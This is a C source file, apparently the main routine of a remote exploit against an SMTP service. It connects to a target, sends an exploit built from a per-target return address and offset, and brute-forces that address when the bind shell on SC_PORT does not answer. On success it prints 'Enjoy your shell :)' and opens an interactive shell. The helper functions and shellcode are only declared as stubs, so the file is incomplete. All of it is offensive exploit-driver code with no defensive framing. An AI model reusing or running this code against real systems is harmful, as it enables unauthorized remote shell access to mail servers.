
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_6__ TYPE_3__ ;
typedef struct TYPE_5__ TYPE_2__ ;
typedef struct TYPE_4__ TYPE_1__ ;


struct TYPE_4__ {int sin_port; int sin_addr; } ;
struct TYPE_6__ {size_t target; int offset; int wait; TYPE_1__ host; } ;
struct TYPE_5__ {int retaddr; char* name; } ;


 int SC_PORT ;
 int banner () ;
 int brutemode ;
 int close (int) ;
 int connect_port (int) ;
 int exit (int) ;
 int exploit (int,int) ;
 int fflush (int ) ;
 char* inet_ntoa (int ) ;
 int init_SPA (int) ;
 int ntohs (int ) ;
 TYPE_3__ options ;
 int parse_options (int,char**) ;
 int printf (char*,...) ;
 int sc ;
 int shell (int) ;
 int sleep (int) ;
 int stdout ;
 int strlen (int ) ;
 TYPE_2__* targets ;

int main(int argc, char **argv)
{
  int address, sock_smtp, sock_shell;

  banner();
  parse_options(argc, argv);
  address = targets[options.target].retaddr - options.offset;
  brutemode = 0;

 bruteforce:

  if (!brutemode)
    {
      printf("[*] Connecting to %s:%d... ",
      inet_ntoa(options.host.sin_addr), ntohs(options.host.sin_port));
      fflush(stdout);
    }

  sock_smtp = connect_port(ntohs(options.host.sin_port));

  if (!brutemode)
    {
      if (!sock_smtp)
 {
   printf("failed.\n\n");
   exit(-1);
 }
      printf("success.\n");
    }

  init_SPA(sock_smtp);
  exploit(sock_smtp, address);
  close(sock_smtp);

  printf("[*] Target: %s - 0x%.8x\n", targets[options.target].name, address);
  printf("[*] Exploit sent, spawning a shell... ");
  fflush(stdout);

  sleep(1);
  sock_shell = connect_port(SC_PORT);

  if (!sock_shell && options.target)
    {
      printf("failed.\n\n");
      exit(-1);
    }
  if (!sock_shell)
    {
      printf("failed.\n\n");
      address -= 1000 - strlen(sc);
      brutemode = 1;
      if (options.wait) sleep(options.wait);
      goto bruteforce;
    }
  printf("success!\n\nEnjoy your shell :)\n\n");
  shell(sock_shell);

  return 0;
}
